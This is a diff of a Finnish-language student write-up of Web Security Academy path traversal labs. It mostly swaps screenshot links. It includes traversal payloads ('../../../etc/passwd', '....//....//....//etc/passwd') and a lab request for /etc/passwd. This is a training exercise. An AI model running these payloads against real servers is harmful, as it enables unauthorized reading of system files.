@@ -174,7 +174,18 @@ Vihjeessä kerrottiin, että tuotekuvien näyttäminen mahdollistaa 'path traver
 Avasin consolin ja menin networkkiin. Löysin pyynnöstä heikon kohdan. 
 Muutin siihen ../../../etc/passwd
 
-<img width="568" alt="Screenshot 2023-11-18 at 14 03 38" src="https://github.com/AkiAleksi/h4/assets/112399816/a6187480-a036-4aac-931b-3d53491b715d">
+
+<img width="522" alt="Screenshot 2023-11-18 at 22 20 34" src="https://github.com/AkiAleksi/h4/assets/112399816/d0b097b6-80c6-4575-a936-9d2937e309fb">
+
+
+
+<img width="436" alt="Screenshot 2023-11-18 at 22 21 09" src="https://github.com/AkiAleksi/h4/assets/112399816/ba451d3b-7059-4a5c-8f2d-fa472b9f988a">
+
+
+<img width="461" alt="Screenshot 2023-11-18 at 22 21 33" src="https://github.com/AkiAleksi/h4/assets/112399816/efebeac8-94f8-433a-98dd-11378d38ff66">
+
+
+
 
 Lab ratkaistu
 
@@ -187,7 +198,15 @@ Lab ratkaistu
 
 e.)
 
-https://0a32007304ea7b9781cb52c4001c00b9.web-security-academy.net/image?filename=/etc/passwd
+GET https://0a4f00a803cca70c836b50ec00ac0006.web-security-academy.net/image?filename=/etc/passwd
+
+
+
+<img width="440" alt="Screenshot 2023-11-18 at 22 28 05" src="https://github.com/AkiAleksi/h4/assets/112399816/00b70ec4-7837-41fc-ac7d-a1709a0ef823">
+
+
+<img width="232" alt="Screenshot 2023-11-18 at 22 30 13" src="https://github.com/AkiAleksi/h4/assets/112399816/f8a10e25-2c87-4951-806e-8756ddaa4a70">
+
 
 
 <img width="639" alt="Screenshot 2023-11-18 at 14 12 33" src="https://github.com/AkiAleksi/h4/assets/112399816/943f765c-7d87-44ab-8102-0bede4e3bf6e">
@@ -198,9 +217,13 @@ f.)
 ....//....//....//etc/passwd
 
 
+<img width="466" alt="Screenshot 2023-11-18 at 22 33 37" src="https://github.com/AkiAleksi/h4/assets/112399816/d1bdc96d-62ec-49d3-b7ce-36c6bd498f78">
 
 
-<img width="261" alt="Screenshot 2023-11-18 at 18 30 12" src="https://github.com/AkiAleksi/h4/assets/112399816/b46c29dc-7fb5-47a4-8ccb-ca502799c2ff">
+<img width="242" alt="Screenshot 2023-11-18 at 22 34 01" src="https://github.com/AkiAleksi/h4/assets/112399816/92c97fa4-ad22-4ff7-a799-80a7645d3895">
+
+
+<img width="456" alt="Screenshot 2023-11-18 at 22 34 15" src="https://github.com/AkiAleksi/h4/assets/112399816/a4b37ac1-4eb3-4010-9992-436684385752">
 
 
 
